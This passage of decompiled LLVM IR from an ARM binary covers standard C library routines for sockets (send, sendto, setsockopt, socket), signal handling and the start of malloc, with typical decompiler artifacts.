  br label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %entry, %dec_label_pc_120ec
  %v1_12108 = phi i32 [ %v0_120dc, %entry ], [ -1, %dec_label_pc_120ec ]
  %v2_12104 = phi i32 [ %v3_120d0, %entry ], [ %v2_12104.pre, %dec_label_pc_120ec ]
  store i32 %v2_12104, i32* @r7, align 4
  ret i32 %v1_12108

; uselistorder directives
  uselistorder i32 %v0_120dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12104, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1210c:
  %v0_1210c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1210c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1210c
  %v5_1210c = udiv i32 %arg2, 4
  %v6_1210c = and i32 %v5_1210c, %arg1
  %v3_12110 = udiv i32 %v6_1210c, 4
  %v4_12110 = mul i32 %v6_1210c, 1073741824
  %v5_12110 = or i32 %v3_12110, %v4_12110
  %v8_12110 = and i32 %v5_12110, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1210c, %bb
  %v9_12110 = phi i32 [ %arg1, %dec_label_pc_1210c ], [ %v8_12110, %bb ]
  ret i32 %v9_12110

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12118 = load i32, i32* @r4, align 4
  store i32 %v3_12118, i32* %stack_var_-24, align 4
  %v6_12118 = load i32, i32* @r5, align 4
  %v9_12118 = load i32, i32* @r6, align 4
  %v12_12118 = load i32, i32* @r7, align 4
  %v15_12118 = load i32, i32* @r8, align 4
  %v18_12118 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @ip, align 4
  %v4_12124 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_12128 = icmp eq i32 %v4_12124, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12128, label %dec_label_pc_12140, label %entry.dec_label_pc_12148_crit_edge

entry.dec_label_pc_12148_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12148

dec_label_pc_12140:                               ; preds = %entry
  store i32 %v3_12118, i32* @r4, align 4
  store i32 %v9_12118, i32* @r6, align 4
  store i32 %v12_12118, i32* @r7, align 4
  store i32 %v15_12118, i32* @r8, align 4
  %v0_12144 = call i32 @__sys_send()
  br label %dec_label_pc_12148

dec_label_pc_12148:                               ; preds = %entry.dec_label_pc_12148_crit_edge, %dec_label_pc_12140
  %v0_12148 = call i32 @__libc_enable_asynccancel()
  %v0_1214c = load i32, i32* @r6, align 4
  store i32 %v0_1214c, i32* @r1, align 4
  store i32 %v0_12148, i32* @r5, align 4
  %v0_12158 = load i32, i32* @r8, align 4
  store i32 %v0_12158, i32* @r3, align 4
  %v0_1215c = load i32, i32* @r4, align 4
  store i32 %v0_1215c, i32* @r0, align 4
  %v0_12160 = call i32 @__sys_send()
  store i32 %v0_12160, i32* @r4, align 4
  %v0_12168 = load i32, i32* @r5, align 4
  %v1_1216c = call i32 @__libc_disable_asynccancel(i32 %v0_12168)
  %v0_12170 = load i32, i32* @r4, align 4
  %v2_12174 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12174, i32* @r4, align 4
  store i32 %v6_12118, i32* @r5, align 4
  store i32 %v9_12118, i32* @r6, align 4
  store i32 %v12_12118, i32* @r7, align 4
  store i32 %v15_12118, i32* @r8, align 4
  store i32 %v18_12118, i32* @lr, align 4
  ret i32 %v0_12170

; uselistorder directives
  uselistorder label %dec_label_pc_12148, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12184 = load i32, i32* @r4, align 4
  store i32 %v3_12184, i32* %stack_var_-16, align 4
  %v0_12198 = load i32, i32* @r0, align 4
  store i32 %v0_12198, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12198, -4095
  br i1 %tmp, label %dec_label_pc_121c0, label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %entry
  %v0_121ac = call i32 @__aeabi_read_tp()
  %v3_121b0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_121b0 = sext i16 %v3_121b0 to i32
  %v0_121b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121b4 = sub i32 0, %v0_121b4
  store i32 %v1_121b4, i32* %r2.global-to-local, align 4
  %v3_121b8 = add i32 %v4_121b0, %v0_121ac
  %v4_121b8 = inttoptr i32 %v3_121b8 to i32*
  store i32 %v1_121b4, i32* %v4_121b8, align 4
  %v2_121c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_121c0

dec_label_pc_121c0:                               ; preds = %entry, %dec_label_pc_121a8
  %v1_121c4 = phi i32 [ %v0_12198, %entry ], [ -1, %dec_label_pc_121a8 ]
  %v2_121c0 = phi i32 [ %v3_12184, %entry ], [ %v2_121c0.pre, %dec_label_pc_121a8 ]
  store i32 %v2_121c0, i32* @r4, align 4
  ret i32 %v1_121c4

; uselistorder directives
  uselistorder i32 %v0_12198, { 1, 0, 2 }
  uselistorder label %dec_label_pc_121c0, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_121c8:
  %v0_121c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_121c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_121c8
  %v2_121cc = load i32, i32* @r4, align 4
  %v5_121cc = udiv i32 %v2_121cc, 2
  %v6_121cc = and i32 %v5_121cc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_121c8, %bb
  %v7_121cc = phi i32 [ %arg1, %dec_label_pc_121c8 ], [ %v6_121cc, %bb ]
  ret i32 %v7_121cc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_121d0 = load i32, i32* @r4, align 4
  store i32 %v3_121d0, i32* %stack_var_-32, align 4
  %v6_121d0 = load i32, i32* @r5, align 4
  %v9_121d0 = load i32, i32* @r6, align 4
  %v12_121d0 = load i32, i32* @r7, align 4
  %v15_121d0 = load i32, i32* @r8, align 4
  %v18_121d0 = load i32, i32* @sb, align 4
  %v21_121d0 = load i32, i32* @sl, align 4
  %v24_121d0 = load i32, i32* @lr, align 4
  %v4_121e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_121e8 = icmp eq i32 %v4_121e0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_121e8, label %dec_label_pc_12208, label %dec_label_pc_12214

dec_label_pc_12208:                               ; preds = %entry
  store i32 %v3_121d0, i32* @r4, align 4
  store i32 %v12_121d0, i32* @r7, align 4
  store i32 %v15_121d0, i32* @r8, align 4
  store i32 %v18_121d0, i32* %sb.global-to-local, align 4
  %v0_12210 = call i32 @__sys_sendto()
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %entry, %dec_label_pc_12208
  %v0_12214 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12214, i32* @r5, align 4
  %v0_12228 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12228, i32* @r0, align 4
  %v0_12230 = call i32 @__sys_sendto()
  store i32 %v0_12230, i32* @r4, align 4
  %v0_12238 = load i32, i32* @r5, align 4
  %v1_1223c = call i32 @__libc_disable_asynccancel(i32 %v0_12238)
  %v0_12240 = load i32, i32* @r4, align 4
  %v2_12248 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12248, i32* @r4, align 4
  store i32 %v6_121d0, i32* @r5, align 4
  store i32 %v9_121d0, i32* @r6, align 4
  store i32 %v12_121d0, i32* @r7, align 4
  store i32 %v15_121d0, i32* @r8, align 4
  store i32 %v18_121d0, i32* @sb, align 4
  store i32 %v21_121d0, i32* @sl, align 4
  store i32 %v24_121d0, i32* @lr, align 4
  ret i32 %v0_12240

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12214, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12258 = load i32, i32* @r4, align 4
  store i32 %v3_12258, i32* %stack_var_-12, align 4
  %v0_12268 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12268, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12268, -4095
  br i1 %tmp, label %dec_label_pc_12290, label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %entry
  %v0_1227c = call i32 @__aeabi_read_tp()
  %v3_12280 = load i16, i16* @global_var_2225c.361, align 2
  %v4_12280 = sext i16 %v3_12280 to i32
  store i32 %v4_12280, i32* @r3, align 4
  %v0_12284 = load i32, i32* %r2.global-to-local, align 4
  %v1_12284 = sub i32 0, %v0_12284
  store i32 %v1_12284, i32* %r2.global-to-local, align 4
  %v3_12288 = add i32 %v4_12280, %v0_1227c
  %v4_12288 = inttoptr i32 %v3_12288 to i32*
  store i32 %v1_12284, i32* %v4_12288, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12290.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12290

dec_label_pc_12290:                               ; preds = %entry, %dec_label_pc_12278
  %v1_12294 = phi i32 [ %v0_12268, %entry ], [ -1, %dec_label_pc_12278 ]
  %v2_12290 = phi i32 [ %v3_12258, %entry ], [ %v2_12290.pre, %dec_label_pc_12278 ]
  store i32 %v2_12290, i32* @r4, align 4
  ret i32 %v1_12294

; uselistorder directives
  uselistorder i32 %v0_12268, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12290, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122a0 = load i32, i32* @r7, align 4
  store i32 %v3_122a0, i32* %stack_var_-8, align 4
  %v0_122ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122ac, -4095
  br i1 %tmp, label %dec_label_pc_122d4, label %dec_label_pc_122bc

dec_label_pc_122bc:                               ; preds = %entry
  %v0_122c0 = call i32 @__aeabi_read_tp()
  %v3_122c4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_122c4 = sext i16 %v3_122c4 to i32
  store i32 %v4_122c4, i32* @r3, align 4
  %v0_122c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_122c8 = sub i32 0, %v0_122c8
  store i32 %v1_122c8, i32* %r2.global-to-local, align 4
  %v3_122cc = add i32 %v4_122c4, %v0_122c0
  %v4_122cc = inttoptr i32 %v3_122cc to i32*
  store i32 %v1_122c8, i32* %v4_122cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_122d4

dec_label_pc_122d4:                               ; preds = %entry, %dec_label_pc_122bc
  %v1_122d8 = phi i32 [ %v0_122ac, %entry ], [ -1, %dec_label_pc_122bc ]
  %v2_122d4 = phi i32 [ %v3_122a0, %entry ], [ %v2_122d4.pre, %dec_label_pc_122bc ]
  store i32 %v2_122d4, i32* @r7, align 4
  ret i32 %v1_122d8

; uselistorder directives
  uselistorder i32 %v0_122ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122d4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_122dc:
  %v0_122dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_122dc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_122dc
  %v2_122dc = load i32, i32* @sb, align 4
  %v8_122dc = shl i32 %v2_122dc, %arg2
  %v9_122dc = and i32 %v8_122dc, %arg1
  %v2_122e0 = mul i32 %v9_122dc, 74472
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_122dc, %bb
  %v3_122e0 = phi i32 [ %arg1, %dec_label_pc_122dc ], [ %v2_122e0, %bb ]
  ret i32 %v3_122e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_122fc, label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %entry
  %v7_122f8 = icmp slt i32 %arg2, 65
  br i1 %v7_122f8, label %dec_label_pc_12318, label %dec_label_pc_122fc

dec_label_pc_122fc:                               ; preds = %dec_label_pc_122f4, %entry
  %v0_12300 = call i32 @__aeabi_read_tp()
  %v3_12304 = load i16, i16* @global_var_2225c.361, align 2
  %v4_12304 = sext i16 %v3_12304 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12310 = add i32 %v4_12304, %v0_12300
  %v4_12310 = inttoptr i32 %v3_12310 to i32*
  store i32 22, i32* %v4_12310, align 4
  %v0_12320.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12320

dec_label_pc_12318:                               ; preds = %dec_label_pc_122f4
  %v0_12318 = call i32 @__sigaddset()
  store i32 %v0_12318, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12320

dec_label_pc_12320:                               ; preds = %dec_label_pc_122fc, %dec_label_pc_12318
  %v0_12320 = phi i32 [ %v0_12320.pre, %dec_label_pc_122fc ], [ %v0_12318, %dec_label_pc_12318 ]
  ret i32 %v0_12320

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12320, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1233c = add i32 %tmp, 4
  %v3_1233c = inttoptr i32 %v2_1233c to i32*
  store i32 0, i32* %v3_1233c, align 4
  %v1_12340 = load i32, i32* %r3.global-to-local, align 4
  %v2_12340 = inttoptr i32 %v1_12340 to i32*
  store i32 0, i32* %v2_12340, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12348 = load i32, i32* @r4, align 4
  store i32 %v3_12348, i32* %stack_var_-16, align 4
  %v6_12348 = load i32, i32* @r5, align 4
  %v9_12348 = load i32, i32* @r6, align 4
  %v7_12350 = icmp eq i32 %arg2, -1
  br i1 %v7_12350, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12358 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_12374

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_1237c

dec_label_pc_12374:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  %v7_12378 = icmp slt i32 %arg1, 65
  br i1 %v7_12378, label %dec_label_pc_12398, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %.thread16, %dec_label_pc_12374
  %v0_12380 = call i32 @__aeabi_read_tp()
  %v3_12384 = load i16, i16* @global_var_2225c.361, align 2
  %v4_12384 = sext i16 %v3_12384 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12390 = add i32 %v4_12384, %v0_12380
  %v4_12390 = inttoptr i32 %v3_12390 to i32*
  store i32 22, i32* %v4_12390, align 4
  %v0_123f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_12398:                               ; preds = %dec_label_pc_12374
  %v2_12398 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12398, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_123a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_123a0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_123b0 = call i32 @__sigaddset()
  %v0_123b8 = load i32, i32* @r5, align 4
  store i32 %v0_123b8, i32* %r1.global-to-local, align 4
  %v0_123bc = load i32, i32* @r6, align 4
  %v2_123bc = add i32 %v0_123bc, 11920
  %v2_123c0 = call i32 @__GI___sigismember(i32 %v2_123bc, i32 %v0_123b8)
  store i32 %v2_12398, i32* %r1.global-to-local, align 4
  %v0_123d4 = load i32, i32* @r5, align 4
  %v3_123e0 = call i32 @__libc_sigaction(i32 %v0_123d4, i32 %v2_12398, i32 %v2_12358)
  %v1_123e4 = icmp slt i32 %v3_123e0, 0
  br i1 %v1_123e4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_12398
  %v5_123e8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_123e8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_12398
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1237c, %bb32
  %v0_123f0 = phi i32 [ %v5_123e8, %bb31 ], [ %v0_123f0.pre, %dec_label_pc_1237c ], [ -1, %bb32 ]
  %v2_123f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_123f8, i32* @r4, align 4
  store i32 %v6_12348, i32* @r5, align 4
  store i32 %v9_12348, i32* @r6, align 4
  ret i32 %v0_123f0

; uselistorder directives
  uselistorder i32 %v2_12398, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1237c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1240c = add i32 %arg2, -1
  %v3_12410 = udiv i32 %v1_1240c, 32
  %v4_12414 = mul nuw nsw i32 %v3_12410, 4
  %v5_12414 = add i32 %v4_12414, %arg1
  %v6_12414 = inttoptr i32 %v5_12414 to i32*
  %v7_12414 = load i32, i32* %v6_12414, align 4
  %v1_12418 = urem i32 %v1_1240c, 32
  %v7_12420 = shl i32 1, %v1_12418
  %v8_12420 = and i32 %v7_12414, %v7_12420
  %v10_12420 = icmp ne i32 %v8_12420, 0
  %. = zext i1 %v10_12420 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1240c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12430 = load i32, i32* @r1, align 4
  %v1_12430 = add i32 %v0_12430, -1
  %v3_12434 = udiv i32 %v1_12430, 32
  %v0_12438 = load i32, i32* @r0, align 4
  %v4_12438 = mul nuw nsw i32 %v3_12434, 4
  %v5_12438 = add i32 %v0_12438, %v4_12438
  %v6_12438 = inttoptr i32 %v5_12438 to i32*
  %v7_12438 = load i32, i32* %v6_12438, align 4
  %v1_1243c = urem i32 %v1_12430, 32
  %v7_12444 = shl i32 1, %v1_1243c
  %v8_12444 = or i32 %v7_12438, %v7_12444
  store i32 %v8_12444, i32* %v6_12438, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12430, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12454 = add i32 %arg2, -1
  %v3_12458 = udiv i32 %v1_12454, 32
  %v4_1245c = mul nuw nsw i32 %v3_12458, 4
  %v5_1245c = add i32 %v4_1245c, %arg1
  %v6_1245c = inttoptr i32 %v5_1245c to i32*
  %v7_1245c = load i32, i32* %v6_1245c, align 4
  %v1_12460 = urem i32 %v1_12454, 32
  %tmp = shl i32 -1, %v1_12460
  %v8_12468 = add i32 %tmp, -1
  %v9_12468 = and i32 %v7_1245c, %v8_12468
  store i32 %v9_12468, i32* %v6_1245c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12454, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_12478 = udiv i32 %arg1, 256
  store i32 %v3_12478, i32* %r1.global-to-local, align 4
  %v2_1247c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1247c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_12488 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1247c, i32 %v0_12488)
  %v0_1248c = load i32, i32* %r1.global-to-local, align 4
  %v1_1248c = add i32 %v0_1248c, 1048320
  %v3_12490 = udiv i32 %v1_1248c, 65536
  %v1_12494 = and i32 %v3_12490, 8
  %v6_12498 = shl i32 %v0_1248c, %v1_12494
  %v1_1249c = add i32 %v6_12498, 520192
  %v3_124a0 = udiv i32 %v1_1249c, 65536
  %v1_124a4 = and i32 %v3_124a0, 4
  %v6_124a8 = shl i32 %v6_12498, %v1_124a4
  %v1_124ac = add i32 %v6_124a8, 245760
  %v3_124b0 = udiv i32 %v1_124ac, 65536
  %v1_124b4 = and i32 %v3_124b0, 2
  %v6_124b8 = shl i32 %v6_124a8, %v1_124b4
  store i32 %v6_124b8, i32* %r1.global-to-local, align 4
  %v1_124bc = sub nsw i32 13, %v1_12494
  %v2_124c0 = sub nsw i32 %v1_124bc, %v1_124a4
  %v3_124c4 = udiv i32 %v6_124b8, 32768
  %v4_124c4 = sub nuw nsw i32 -1, %v3_124c4
  %v4_124c8 = udiv i32 %v6_124b8, 16384
  %v5_124c8 = and i32 %v4_124c8, %v4_124c4
  %v2_124cc = sub nsw i32 %v2_124c0, %v1_124b4
  %v2_124d0 = add nsw i32 %v2_124cc, %v5_124c8
  %v1_124d4 = add nsw i32 %v2_124d0, 6
  %v0_124d8 = load i32, i32* %ip.global-to-local, align 4
  %v6_124d8 = lshr i32 %v0_124d8, %v1_124d4
  %v3_124dc = mul nsw i32 %v2_124d0, 4
  %v1_124e0 = add nsw i32 %v3_124dc, 32
  %v1_124e4 = urem i32 %v6_124d8, 4
  %v2_124e8 = or i32 %v1_124e4, %v1_124e0
  ret i32 %v2_124e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_124f0 = load i32, i32* @r4, align 4
  %v6_124f0 = load i32, i32* @r5, align 4
  %v9_124f0 = load i32, i32* @r6, align 4
  %v12_124f0 = load i32, i32* @r7, align 4
  %v15_124f0 = load i32, i32* @r8, align 4
  %v18_124f0 = load i32, i32* @sb, align 4
  %v21_124f0 = load i32, i32* @sl, align 4
  %v24_124f0 = load i32, i32* @fp, align 4
  %v27_124f0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_12504 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 108) to i32*), align 4
  store i32 %v4_12504, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12510 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), align 4
  store i32 %v4_12510, i32* %r1.global-to-local, align 4
  %v0_12514 = load i32, i32* @r0, align 4
  store i32 %v0_12514, i32* @r5, align 4
  store i32 %v4_12504, i32* %r2.global-to-local, align 4
  %v2_1251c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1251c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v4_12528 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  store i32 %v4_12528, i32* %ip.global-to-local, align 4
  store i32 75060, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12528)
  %v0_12534 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12534, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r1, align 4
  %v4_12540 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 16) to i32*), align 4
  store i32 %v4_12540, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1254c.452 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12540)
  %v0_1254c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1254c, -32
  br i1 %tmp, label %dec_label_pc_12570, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_fcf8.179 to i32), i32* %r2.global-to-local, align 4
  %v0_12558 = call i32 @__aeabi_read_tp()
  store i32 %v0_12558, i32* %r0.global-to-local, align 4
  %v3_1255c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1255c = sext i16 %v3_1255c to i32
  store i32 %v4_1255c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12568 = add i32 %v4_1255c, %v0_12558
  %v4_12568 = inttoptr i32 %v3_12568 to i32*
  store i32 12, i32* %v4_12568, align 4
  br label %dec_label_pc_12df4

dec_label_pc_12570:                               ; preds = %entry
  %v1_12570 = add i32 %v0_1254c, 11
  store i32 %v1_12570, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v2_1257c = icmp ugt i32 %v1_12570, 14
  %v7_1257c = icmp eq i32 %v1_12570, 15
  %v2_12580 = xor i1 %v7_1257c, true
  %v3_12580 = and i1 %v2_1257c, %v2_12580
  br i1 %v3_12580, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_12570
  %v5_12580 = and i32 %v1_12570, -8
  store i32 %v5_12580, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_12570, %bb
  %v4_12584 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12584, i32* @r0, align 4
  %v1_12588 = inttoptr i32 %v4_12584 to i32*
  %v2_12588 = load i32, i32* %v1_12588, align 4
  store i32 %v2_12588, i32* @r4, align 4
  %v2_1258c = xor i1 %v2_1257c, true
  %v3_1258c = or i1 %v7_1257c, %v2_1258c
  br i1 %v3_1258c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_12590 = urem i32 %v2_12588, 2
  %v2_12590 = icmp eq i32 %v1_12590, 0
  br i1 %v2_12590, label %dec_label_pc_12598, label %dec_label_pc_125a8

